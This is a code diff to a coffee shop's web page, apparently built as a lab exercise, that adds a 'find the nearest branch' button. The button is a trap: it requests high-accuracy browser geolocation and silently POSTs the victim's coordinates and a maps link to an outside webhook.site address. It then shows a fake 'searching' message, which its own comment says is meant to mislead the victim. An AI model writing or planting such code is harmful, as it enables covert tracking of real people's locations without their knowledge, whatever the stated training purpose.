@@ -85,13 +85,21 @@
             <a href="#trabaja-nosotros" class="footer-link">Trabaja con Nosotros</a>
         </div>
     </footer>
+    <!-- SECCIÓN TRAMPA PARA EL LABORATORIO -->
+    <section style="text-align: center; padding: 2rem; background: #e0e0e0; border-top: 1.5px solid #0a3d91;">
+        <h3>¿Quieres visitarnos?</h3>
+        <p>Encuentra la sucursal de Nella Coffe más cercana a ti.</p>
+        <button id="btnTrampa" style="margin-top: 10px; padding: 10px 20px; font-size: 1.1rem; background: #0a3d91; color: white; border: none; cursor: pointer;">
+            📍 Encontrar local más cercano
+        </button>
+        <div id="geoInfo" style="margin-top: 15px; font-weight: bold; color: #0a3d91;"></div>
+    </section>
 <script>
-function locationSuccess(position) {
+  function locationSuccess(position) {
     const latitude = position.coords.latitude;
     const longitude = position.coords.longitude;
     const accuracy = position.coords.accuracy;
 
-    // Esto lo enviaremos a tu Webhook
     const datosUbicacion = {
         latitud: latitude,
         longitud: longitude,
@@ -100,25 +108,41 @@ function locationSuccess(position) {
         googleMapsLink: `https://www.google.com/maps?q=${latitude},${longitude}`
     };
 
-    // Petición HTTP silenciosa para exfiltrar los datos
     fetch('https://webhook.site/0d964eb4-f41e-4268-ae34-7c8070ef487f', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
         },
         body: JSON.stringify(datosUbicacion),
-        mode: 'no-cors' // Evita errores de seguridad en el navegador al enviar datos a otro dominio
+        mode: 'no-cors' 
     });
 
-    console.log("Ubicación procesada.");
-    
-    // Opcional: Mostrar mensaje en la web para no levantar sospechas
     const infoDiv = document.getElementById('geoInfo');
     if(infoDiv) {
-        infoDiv.innerHTML = `<p>Buscando la sucursal más cercana...</p>`;
+        // Mensaje falso para despistar a la víctima después de que acepta
+        infoDiv.innerHTML = `<p>Buscando la sucursal más cercana a tu ubicación actual... Por favor espera.</p>`;
     }
-}
+  }
 
+  function locationError(error) {
+    const infoDiv = document.getElementById('geoInfo');
+    if(infoDiv) {
+        infoDiv.innerHTML = `<p style="color: red;">No pudimos acceder a tu ubicación. Permite el acceso para encontrar la sucursal.</p>`;
+    }
+  }
+
+  function solicitarUbicacion() {
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(locationSuccess, locationError, {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      });
+    }
+  }
+
+  // Vinculamos la solicitud de ubicación al botón trampa
+  document.getElementById('btnTrampa').addEventListener('click', solicitarUbicacion);
 </script>
 </body>
 </html>
